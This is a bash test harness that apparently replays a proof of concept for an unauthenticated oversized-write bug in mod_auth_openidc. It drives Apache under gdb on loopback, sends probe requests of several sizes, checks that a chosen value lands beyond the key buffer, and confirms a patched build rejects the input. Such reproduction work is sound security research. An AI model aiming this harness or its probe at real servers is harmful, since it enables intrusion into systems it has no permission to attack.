#!/bin/bash
# W217: does a 144-byte attacker-sized write reach a live field beyond the
# CEK in the real unauthenticated bearer lane? One request per fresh
# gdb/Aprocess; loopback 127.0.0.1:18444 / :18445 only. No listener is left.
set -eu
T=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
W2=$(CDPATH= cd -- "$T/.." && pwd)
GDBPIDS=""
PASS=0
FAIL=0
sed -e "s|@W2@|$W2|g" -e "s|@T@|$T|g" "$T/apache-w217.conf" > "$T/apache-vuln.run.conf"
mkdir -p "$T/evidence" "$T/run" "$T/cache" "$T/html" "$T/fixed-cache" "$T/fixed-run"
ln -sfn "$W2/mod_auth_openidc-fixed" "$T/mod_auth_openidc-fixed"
sed "s|@HERE@|$T|g" "$W2/apache-oauth-bearer-fixed.conf" > "$T/apache-fixed.run.conf"
sed "s|@HERE@|$T|g" "$W2/gdb-oauth-bearer-fixed.cmd" > "$T/gdb-fixed.cmd"

cleanup() {
    if [ -f "$T/apache.pid" ]; then kill "$(cat "$T/apache.pid")" 2>/dev/null || true; rm -f "$T/apache.pid"; fi
    for p in $GDBPIDS; do kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; done
}
trap cleanup EXIT INT TERM

check() {
    if [ "$2" = "$3" ]; then PASS=$((PASS + 1)); else FAIL=$((FAIL + 1)); fi
    printf 'CHECK %-28s observed=%s expected=%s\n' "$1" "$2" "$3"
}

start() {
    conf=$1; cmd=$2; out=$3; port=$4
    timeout 60 gdb -q -batch -x "$cmd" --args /usr/sbin/apache2 -f "$conf" -X \
        > "$out" 2>&1 &
    GDBPIDS="$GDBPIDS $!"
    for i in $(seq 1 150); do
        if ss -ltn | grep -q ":$port "; then return 0; fi
        sleep 0.2
    done
    echo "LISTENER_NOT_READY=$port" >&2
    exit 2
}
stop() {
    for p in $GDBPIDS; do kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; done
    GDBPIDS=""
    sleep 1
}

if [ "$(ss -ltn | grep -cE ':1844[45] ' || true)" -ne 0 ]; then echo PORTS_BUSY >&2; exit 3; fi
: > "$T/evidence/oauth-bearer-fixed-apache_error.log"

for spec in safe:w217-safe:40 ptr:w217-ptr:80 zero:w217-zero:152 long:w217-long:152; do
    mode=${spec%%:*}; rest=${spec#*:}; tag=${rest%%:*}; len=${rest##*:}
    sed "s|@LOG@|$T/evidence/gdb-$tag.log|" "$T/gdb-w217.cmd" > "$T/gdb-$tag.cmd"
    start "$T/apache-vuln.run.conf" "$T/gdb-$tag.cmd" "$T/evidence/stdout-$tag.log" 18444
    W2_PORT=18444 W2_TAG="$tag" python3 "$T/probe-w217.py" "$mode" \
        > "$T/evidence/probe-$tag.log" 2>&1
    sleep 2
    stop
done

start "$T/apache-fixed.run.conf" "$T/gdb-fixed.cmd" \
      "$T/evidence/stdout-fixed-long.log" 18445
W2_PORT=18445 W2_TAG=w217-fixed-long python3 "$T/probe-w217.py" long \
    > "$T/evidence/probe-w217-fixed-long.log" 2>&1
sleep 2
stop

L="$T/evidence/gdb-w217-long.log"
check LONG_RAW152 "$(grep -c 'W2E_KW_DECRYPT raw_len=152' "$L" || true)" 1
check LONG_UNWRAP "$(grep -c W2E_UNWRAP_KEY_REACHED "$L" || true)" 1
check LONG_DUMP "$(grep -c W2E_POST_UNWRAP "$L" || true)" 1
check LONG_CHOSEN_FAR "$(grep -c '0x4141414141414141' "$L" || true)" 1
check SAFE_RAW40 "$(grep -c 'W2E_KW_DECRYPT raw_len=40' "$T/evidence/gdb-w217-safe.log" || true)" 1
check PTR_RAW80 "$(grep -c 'W2E_KW_DECRYPT raw_len=80' "$T/evidence/gdb-w217-ptr.log" || true)" 1
check ZERO_RAW152 "$(grep -c 'W2E_KW_DECRYPT raw_len=152' "$T/evidence/gdb-w217-zero.log" || true)" 1
FLOG="$T/evidence/oauth-bearer-fixed-gdb.log"
check FIXED_REJECT599 "$(grep -c 'line: 599' "$T/evidence/oauth-bearer-fixed-apache_error.log" || true)" 1
check FIXED_NO_UNWRAP "$(grep -c W2BF_AES_UNWRAP_KEY_REACHED "$FLOG" || true)" 0
check FIXED_KW_REACHED "$(grep -c 'W2BF_AES_KW_DECRYPT_REACHED raw_len=152' "$FLOG" || true)" 1

printf 'W217_DEREF_HITS long=%s zero=%s ptr=%s SIGNAL_LINES=%s\n' \
  "$(grep -c W2E_STRCMP_PTR_HIT "$L" || true)" \
  "$(grep -c W2E_STRCMP_PTR_HIT "$T/evidence/gdb-w217-zero.log" || true)" \
  "$(grep -c W2E_STRCMP_PTR_HIT "$T/evidence/gdb-w217-ptr.log" || true)" \
  "$(grep -c 'Program received signal' "$L" || true)"
printf 'REPLAY_W217: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
ss -ltn | grep -E ':1844[45] ' || echo NO_LISTENER_LEFT
[ "$FAIL" -eq 0 ]
